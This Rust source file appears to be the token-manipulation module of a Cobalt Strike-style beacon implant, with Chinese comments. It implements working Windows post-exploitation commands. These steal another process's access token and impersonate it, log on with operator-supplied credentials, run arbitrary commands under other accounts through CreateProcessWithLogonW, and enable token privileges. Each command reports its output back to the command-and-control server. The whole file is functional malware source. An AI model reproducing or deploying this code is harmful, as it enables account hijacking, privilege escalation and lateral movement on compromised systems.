#[cfg(target_os = "windows")]
use std::io::Cursor;
use std::ptr::{addr_of_mut, null, null_mut};

use windows_sys::core::{PCSTR, PWSTR};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, LUID};
use windows_sys::Win32::Security::{
    AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser, LogonUserW,
    LookupPrivilegeValueA, RevertToSelf, SecurityImpersonation, TokenPrimary,
    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, LUID_AND_ATTRIBUTES,
    SECURITY_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_DEFAULT, TOKEN_ADJUST_PRIVILEGES,
    TOKEN_ADJUST_SESSIONID, TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use windows_sys::Win32::Storage::FileSystem::ReadFile;
use windows_sys::Win32::System::Pipes::CreatePipe;
use windows_sys::Win32::System::Threading::{
    CreateProcessWithLogonW, CreateProcessWithTokenW, GetCurrentProcess, OpenProcess,
    OpenProcessToken, WaitForSingleObject, INFINITE, LOGON_WITH_PROFILE, PROCESS_INFORMATION,
    PROCESS_QUERY_INFORMATION, PROCESS_QUERY_LIMITED_INFORMATION, STARTF_USESTDHANDLES,
    STARTUPINFOW,
};
use windows_sys::Win32::System::IO::OVERLAPPED;

#[cfg(target_os = "windows")]
use crate::util::data_parse::{
    beacon_read_i32, beacon_read_length_and_string, beacon_read_short, beacon_send_result,
};
use crate::util::encode::to_wide_string;
use crate::util::jobs::CALLBACK_OUTPUT;
use crate::BEACON;

pub static mut IS_STRAL_TOKEN: bool = false;
pub static mut STEAL_TOKEN: HANDLE = null_mut();

pub fn get_privs(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _ = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let privs_cnt = beacon_read_short(&mut decrypted_cursor).unwrap();
    // 创建 privs 数组来存储权限字符串
    let mut privs = Vec::new();
    let mut cnt: i16 = 0;

    while cnt < privs_cnt {
        let (_, priv_vec) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

        let priv_str = String::from_utf8(priv_vec).unwrap();
        privs.push(priv_str);
        cnt += 1;
    }
    unsafe {
        for priv_name in privs {
            match set_privilege(&priv_name) {
                Ok(()) => {
                    println!("Successfully requested privilege: {:?}", priv_name);
                }
                Err(error_message) => {
                    eprintln!("{}", error_message);
                    beacon_send_result(error_message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
                    continue;
                }
            }
        }
        beacon_send_result(b"OK", &BEACON, CALLBACK_OUTPUT).unwrap();
    }
}

pub fn steal_token(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _ = beacon_read_i32(&mut decrypted_cursor).unwrap() as u32;
    let pid = beacon_read_i32(&mut decrypted_cursor).unwrap() as u32;

    let mut process_handle = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION, 1, pid) };

    if process_handle.is_null() {
        process_handle = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 1, pid) };
    }
    if process_handle.is_null() {
        eprintln!("Failed to open process");
        beacon_send_result(b"Failed to open process", &BEACON, CALLBACK_OUTPUT).unwrap();
        return;
    }

    // 打开进程令牌
    let mut token_handle: HANDLE = 0 as HANDLE;
    if unsafe {
        OpenProcessToken(
            process_handle,
            TOKEN_QUERY | TOKEN_DUPLICATE,
            &mut token_handle,
        )
    } == 0
    {
        unsafe {
            CloseHandle(process_handle);
        }
        eprintln!("Failed to open process token");
        beacon_send_result(b"Failed to open process token", &BEACON, CALLBACK_OUTPUT).unwrap();
        return;
        // return Err(format!("OpenProcessToken error: {}", unsafe { GetLastError() }));
    }

    // 模拟用户
    let result = unsafe { ImpersonateLoggedOnUser(token_handle) };
    if result == 0 {
        eprintln!("Failed to impersonate logged on user");
        beacon_send_result(
            b"Failed to impersonate logged on user",
            &BEACON,
            CALLBACK_OUTPUT,
        )
        .unwrap();
        return;
    }

    // 复制令牌
    let mut duplicated_token_handle: HANDLE = 0 as HANDLE;
    let result = unsafe {
        DuplicateTokenEx(
            token_handle,
            TOKEN_ADJUST_DEFAULT
                | TOKEN_ADJUST_SESSIONID
                | TOKEN_QUERY
                | TOKEN_DUPLICATE
                | TOKEN_ASSIGN_PRIMARY,
            null_mut(),
            SecurityImpersonation,
            TokenPrimary,
            &mut duplicated_token_handle,
        )
    };
    if result == 0 {
        unsafe {
            CloseHandle(token_handle);
        }
        unsafe {
            CloseHandle(process_handle);
        }
        eprintln!("Failed to duplicate token");
        beacon_send_result(b"Failed to duplicate token", &BEACON, CALLBACK_OUTPUT).unwrap();
        return;
    }

    // 创建管道，用于捕获子进程输出
    let mut read_pipe: HANDLE = 0 as HANDLE;
    let mut write_pipe: HANDLE = 0 as HANDLE;
    unsafe {
        if CreatePipe(&mut read_pipe, &mut write_pipe, null_mut(), 0) == 0 {
            let error_code = GetLastError();
            println!("CreatePipe failed. Error code: {}", error_code);
            beacon_send_result(b"Failed to create pipe", &BEACON, CALLBACK_OUTPUT).unwrap();
            return;
        }
    }

    // 初始化 `STARTUPINFO` 结构体
    let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    startup_info.dwFlags = STARTF_USESTDHANDLES;
    startup_info.hStdOutput = write_pipe;
    startup_info.hStdError = write_pipe;

    // 初始化 `PROCESS_INFORMATION` 结构体
    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    // 要执行的程序路径和命令
    let cmd_path = to_wide_string("C:\\Windows\\System32\\cmd.exe");
    let cmd_args = to_wide_string("/c whoami");

    // 调用 `CreateProcessWithTokenW`
    let result = unsafe {
        CreateProcessWithTokenW(
            duplicated_token_handle,    // Token handle
            LOGON_WITH_PROFILE,         // 启动配置
            cmd_path.as_ptr(),          // 程序路径
            cmd_args.as_ptr() as PWSTR, // 命令行参数
            0,                          // 创建标志
            null_mut(),                 // 环境变量 (NULL)
            null_mut(),                 // 当前目录 (NULL)
            &startup_info,              // 指向 `STARTUPINFO` 结构体
            &mut process_info,          // 指向 `PROCESS_INFORMATION` 结构体
        )
    };

    // 检查是否成功
    unsafe {
        if result == 0 {
            let error_code = GetLastError();
            println!("CreateProcessWithTokenW failed. Error code: {}", error_code);
            beacon_send_result(b"Failed to create process", &BEACON, CALLBACK_OUTPUT).unwrap();
            return;
        }
    }

    // 等待进程完成
    unsafe {
        WaitForSingleObject(process_info.hProcess, INFINITE);
    }

    // 读取子进程的输出
    let mut buffer = [0u8; 4096];
    let mut bytes_read = 0u32;
    unsafe {
        if ReadFile(
            read_pipe,
            buffer.as_mut_ptr() as *mut _,
            buffer.len() as u32,
            &mut bytes_read,
            null_mut(),
        ) == 0
        {
            let error_code = GetLastError();
            println!("ReadFile failed. Error code: {}", error_code);
            beacon_send_result(b"Failed to read from pipe", &BEACON, CALLBACK_OUTPUT).unwrap();
        } else {
            let output = String::from_utf8_lossy(&buffer[..bytes_read as usize]);
            println!("whoami output: {}", output);
            let message = format!("ok\n{}", output);
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
            IS_STRAL_TOKEN = true;
            STEAL_TOKEN = duplicated_token_handle;
        }
    }

    // 关闭原令牌和进程句柄
    unsafe {
        CloseHandle(token_handle);
    }
    unsafe {
        CloseHandle(process_handle);
    }
}

pub fn rev2self() {
    unsafe {
        if IS_STRAL_TOKEN == true {
            unsafe {
                CloseHandle(STEAL_TOKEN);
            }
            unsafe {
                if RevertToSelf() == 0 {
                    let error_code = GetLastError();
                    println!("RevertToSelf failed. Error code: {}", error_code);
                    beacon_send_result(b"Failed to revert to self", &BEACON, CALLBACK_OUTPUT)
                        .unwrap();
                    return;
                }
            }
            IS_STRAL_TOKEN = false;
            beacon_send_result(b"ok", &BEACON, CALLBACK_OUTPUT).unwrap()
        }
    }
}
fn set_privilege(priv_name: &str) -> Result<(), String> {
    let mut token_handle = 0 as HANDLE;
    unsafe {
        if IS_STRAL_TOKEN {
            token_handle = STEAL_TOKEN;
        } else {
            // 获取当前进程的句柄
            let process_handle = GetCurrentProcess();

            // 打开进程的令牌
            let open_token_result = OpenProcessToken(
                process_handle,
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                &mut token_handle,
            );

            if open_token_result == 0 {
                eprintln!("Failed to open process token: {:?}", open_token_result);
                beacon_send_result(b"Failed to open process token", &BEACON, CALLBACK_OUTPUT)
                    .unwrap();
            }
        }
    }

    // 查找权限的 LUID
    let mut luid = LUID {
        LowPart: 0,
        HighPart: 0,
    };
    let lookup_result = unsafe {
        LookupPrivilegeValueA(
            null_mut(), // system name, null for local system
            priv_name.as_ptr() as PCSTR,
            &mut luid,
        )
    };

    if lookup_result == 0 {
        return Err(format!(
            "Failed to lookup privilege value for {:?}",
            priv_name
        ));
    }

    // 准备 TOKEN_PRIVILEGES 结构
    let token_privileges = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    // 调整令牌权限
    let adjust_result = unsafe {
        AdjustTokenPrivileges(
            token_handle,
            false as _,
            &token_privileges,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            null_mut(),
            null_mut(),
        )
    };

    if adjust_result == 0 {
        return Err(format!(
            "Failed to adjust token privileges for {:?}",
            priv_name
        ));
    }
    unsafe {
        CloseHandle(token_handle);
    }

    Ok(())
}

pub fn runas(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _ = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let (_, domain_vec) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let (_, username_vec) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let (_, password_vec) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let (_, command_vec) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let domain = String::from_utf8(domain_vec).unwrap();
    let username = String::from_utf8(username_vec).unwrap();
    let password = String::from_utf8(password_vec).unwrap();
    let command = String::from_utf8(command_vec).unwrap();

    unsafe {
        let mut h_r_pipe: HANDLE = 0 as HANDLE;
        let mut h_w_pipe: HANDLE = 0 as HANDLE;

        // 设置管道的安全属性
        let sa = SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: null_mut(),
            bInheritHandle: 1, // true
        };

        // 创建匿名管道
        if CreatePipe(&mut h_r_pipe, &mut h_w_pipe, &sa, 0) == 0 {
            eprintln!("Failed to create pipe");
            return;
        }

        // 配置 STARTUPINFO，重定向输出
        let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        startup_info.dwFlags = STARTF_USESTDHANDLES;
        startup_info.hStdOutput = h_w_pipe;
        startup_info.hStdError = h_w_pipe;

        let mut proc_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

        // 将命令转换为 wide string (UTF-16)
        let cmd = to_wide_string(&command);

        // 使用用户凭证启动进程
        if CreateProcessWithLogonW(
            to_wide_string(&username).as_ptr(),
            to_wide_string(&domain).as_ptr(),
            to_wide_string(&password).as_ptr(),
            0x00000001, // LOGON_WITH_PROFILE
            null(),
            cmd.as_ptr() as PWSTR,
            0, // 创建标志
            null_mut(),
            null(),
            &mut startup_info,
            &mut proc_info,
        ) == 0
        {
            eprintln!("Failed to create process");
            return;
        }

        // 等待进程完成
        WaitForSingleObject(proc_info.hProcess, 10 * 1000);

        // 从管道中读取输出
        let mut buffer = [0u8; 4096];
        let mut bytes_read = 0;
        let mut overlapped: OVERLAPPED = unsafe { std::mem::zeroed() };

        if ReadFile(
            h_r_pipe,
            buffer.as_mut_ptr(),
            buffer.len() as u32,
            &mut bytes_read,
            &mut overlapped,
        ) == 0
        {
            eprintln!("Failed to read from pipe");
            return;
        }

        let output = String::from_utf8_lossy(&buffer[..bytes_read as usize]);
        // 仅在 debug 模式下打印
        if cfg!(debug_assertions) {
            println!("Command output: {}", output);
        }
        beacon_send_result(output.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();

        // 清理句柄
        CloseHandle(proc_info.hProcess);
        CloseHandle(proc_info.hThread);
        CloseHandle(h_r_pipe);
        CloseHandle(h_w_pipe);
    }
}

pub fn make_token(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _ = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let (_, domain_vec) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let (_, username_vec) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let (_, password_vec) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let domain = String::from_utf8(domain_vec).unwrap();
    let username = String::from_utf8(username_vec).unwrap();
    let password = String::from_utf8(password_vec).unwrap();
    // 获取模拟的用户 token
    let mut token: HANDLE = 0 as HANDLE;

    // 调用 LogonUserW 模拟用户登录
    let logon_result = unsafe {
        LogonUserW(
            to_wide_string(&username).as_ptr(),
            to_wide_string(&domain).as_ptr(),
            to_wide_string(&password).as_ptr(),
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_DEFAULT,
            &mut token,
        )
    };

    if logon_result == 0 {
        let error_code = unsafe { GetLastError() };
        eprintln!("LogonUserW failed with error code: {}", error_code);
        return;
    }
    // 模拟已登录用户
    unsafe {
        let result = ImpersonateLoggedOnUser(token);
        if result == 0 {
            let error_code = GetLastError();
            eprintln!(
                "ImpersonateLoggedOnUser failed with error code: {}",
                error_code
            );
            return;
        }
    }

    // 关闭上一个可能存在的 stolenToken
    unsafe {
        if IS_STRAL_TOKEN == true {
            CloseHandle(STEAL_TOKEN);
            IS_STRAL_TOKEN = false;
        }
    }
    let result = unsafe { ImpersonateLoggedOnUser(token) };
    if result == 0 {
        eprintln!("Failed to impersonate logged on user");
        beacon_send_result(
            b"Failed to impersonate logged on user",
            &BEACON,
            CALLBACK_OUTPUT,
        )
        .unwrap();
        return;
    }

    // 复制令牌，获取一个可用于后续操作的新令牌
    let duplicate_result = unsafe {
        DuplicateTokenEx(
            token,
            TOKEN_ADJUST_DEFAULT
                | TOKEN_ADJUST_SESSIONID
                | TOKEN_QUERY
                | TOKEN_DUPLICATE
                | TOKEN_ASSIGN_PRIMARY,
            null_mut(),
            2i32,
            TokenPrimary,
            addr_of_mut!(STEAL_TOKEN),
        )
    };

    if duplicate_result == 0 {
        let error_code = unsafe { GetLastError() };
        eprintln!("DuplicateTokenEx failed with error code: {}", error_code);
        return;
    }

    // 设置标记，表示当前 token 是有效的
    unsafe {
        IS_STRAL_TOKEN = true;
    }
    beacon_send_result(b"make token success", &BEACON, CALLBACK_OUTPUT).unwrap()
    // //进行 token 测试
    // // 创建管道，用于捕获子进程输出
    // let mut read_pipe: HANDLE = 0 as HANDLE;
    // let mut write_pipe: HANDLE = 0 as HANDLE;
    // unsafe {
    //     if CreatePipe(&mut read_pipe, &mut write_pipe, null_mut(), 0) == 0 {
    //         let error_code = GetLastError();
    //         println!("CreatePipe failed. Error code: {}", error_code);
    //         beacon_send_result(b"Failed to create pipe", &BEACON, CALLBACK_OUTPUT).unwrap();
    //         return;
    //     }
    // }
    //
    // // 初始化 `STARTUPINFO` 结构体
    // let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
    // startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    // startup_info.dwFlags = STARTF_USESTDHANDLES;
    // startup_info.hStdOutput = write_pipe;
    // startup_info.hStdError = write_pipe;
    //
    // // 初始化 `PROCESS_INFORMATION` 结构体
    // let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    //
    // // 要执行的程序路径和命令
    // let cmd_path = to_wide_string("C:\\Windows\\System32\\cmd.exe");
    // let cmd_args = to_wide_string("/c whoami");
    //
    // // 调用 `CreateProcessWithTokenW`
    // let result = unsafe {
    //     CreateProcessWithTokenW(
    //         STEAL_TOKEN,                // Token handle
    //         LOGON_WITH_PROFILE,         // 启动配置
    //         cmd_path.as_ptr(),          // 程序路径
    //         cmd_args.as_ptr() as PWSTR, // 命令行参数
    //         0,                          // 创建标志
    //         null_mut(),                 // 环境变量 (NULL)
    //         null_mut(),                 // 当前目录 (NULL)
    //         &startup_info,              // 指向 `STARTUPINFO` 结构体
    //         &mut process_info,          // 指向 `PROCESS_INFORMATION` 结构体
    //     )
    // };
    //
    // // 检查是否成功
    // unsafe {
    //     if result == 0 {
    //         let error_code = GetLastError();
    //         println!("CreateProcessWithTokenW failed. Error code: {}", error_code);
    //         beacon_send_result(b"Failed to create process", &BEACON, CALLBACK_OUTPUT).unwrap();
    //         return;
    //     }
    // }
    //
    // // 等待进程完成
    // unsafe {
    //     WaitForSingleObject(process_info.hProcess, INFINITE);
    // }
    //
    // // 读取子进程的输出
    // let mut buffer = [0u8; 4096];
    // let mut bytes_read = 0u32;
    // unsafe {
    //     if ReadFile(
    //         read_pipe,
    //         buffer.as_mut_ptr() as *mut _,
    //         buffer.len() as u32,
    //         &mut bytes_read,
    //         null_mut(),
    //     ) == 0
    //     {
    //         let error_code = GetLastError();
    //         println!("ReadFile failed. Error code: {}", error_code);
    //         beacon_send_result(b"Failed to read from pipe", &BEACON, CALLBACK_OUTPUT).unwrap();
    //     } else {
    //         let output = String::from_utf8_lossy(&buffer[..bytes_read as usize]);
    //         println!("output: {}", output);
    //         let message = format!("ok\n{}", output);
    //         beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
    //     }
    // }
}
